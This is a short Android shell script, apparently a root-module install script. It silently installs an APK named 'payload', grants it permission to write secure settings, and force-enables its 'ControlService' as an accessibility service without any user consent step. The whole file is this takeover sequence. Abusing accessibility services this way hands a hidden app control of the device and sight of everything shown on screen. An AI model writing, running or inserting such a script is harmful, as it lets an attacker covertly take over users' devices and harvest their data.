#!/system/bin/sh

TARGET_PACKAGE=com.example.payload
pm install -r "$MODPATH/payload.apk"
pm grant "$TARGET_PACKAGE" android.permission.WRITE_SECURE_SETTINGS
settings put secure enabled_accessibility_services "$TARGET_PACKAGE/.ControlService"
settings put secure accessibility_enabled 1
